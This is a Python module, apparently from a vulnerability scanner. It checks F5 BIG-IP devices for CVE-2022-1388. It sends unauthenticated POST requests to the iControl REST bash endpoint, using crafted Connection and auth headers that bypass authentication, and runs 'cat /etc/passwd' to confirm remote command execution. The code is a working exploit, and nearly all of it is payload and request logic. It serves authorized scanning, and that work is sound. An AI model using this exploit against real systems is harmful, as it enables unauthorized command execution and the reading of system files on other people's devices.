#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2022_1388_payloads = [
    {
        'path': 'mgmt/tm/util/bash',
        'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
    },
    {
        'path': 'tm/util/bash',
        'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
    },
    {
        'path': 'util/bash',
        'data': '{"command": "run", "utilCmdArgs": "-c \'cat /etc/passwd\'"}'
    }
]

def cve_2022_1388_scan(self, clients):
    ''' 未经身份验证的攻击者可以通过管理端口或自身IP地址
            对BIG-IP系统进行网络访问, 执行任意系统命令、创建或删除文件或禁用服务
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        # 'vul_type': 'unAuthorized',
        'vul_type': 'unAuth/RCE',
        'vul_id': 'CVE-2022-1388',
    }

    headers = {
        'Connection': 'close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host',
        'Content-type': 'application/json',
        'Authorization': 'Basic YWRtaW46',
        'X-F5-Auth-Token': 'mouse'
    }

    for payload in cve_2022_1388_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('commandResult' in res.text) 
            and check.check_res_fileread(res.text)
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
